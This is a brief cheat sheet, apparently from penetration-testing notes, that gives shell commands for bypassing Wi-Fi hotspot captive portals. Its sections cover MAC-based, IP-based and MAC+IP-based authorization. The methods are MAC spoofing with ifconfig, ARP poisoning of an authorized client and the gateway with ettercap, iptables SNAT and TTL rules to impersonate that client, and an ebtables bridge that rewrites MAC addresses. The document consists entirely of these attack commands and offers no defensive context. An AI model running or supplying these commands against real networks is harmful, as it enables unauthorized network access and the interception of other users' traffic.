# Hotspot Captive Portal Bypass  
## MAC-based Authorization  
ifconfig wlan0 hw ether <authorized_MAC_address>  

## IP-based Authorization  
echo 1 > /proc/sys/net/ipv4/ip_forward;   
ettercap -T -q -i wlan0 -w dump -M ARP /<IP_authorized_client>/ /<IP_gateway>/;  
iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <IP_authorized_client>;  
iptables -t mangle -A FORWARD -d <IP_authorized_client> -j TTL --ttl-inc 1;  

## MAC+IP-based Authorization  
modprobe bridge;  
brctl addbr br0;  
brctl addif br0 <interface>;  
ebtables -t nat -A POSTROUTING -o <interface> -d <MAC_gateway> -j snat --to-source <MAC_authorized_client>;  

## Then apply method for IP-based Authorization bypass  
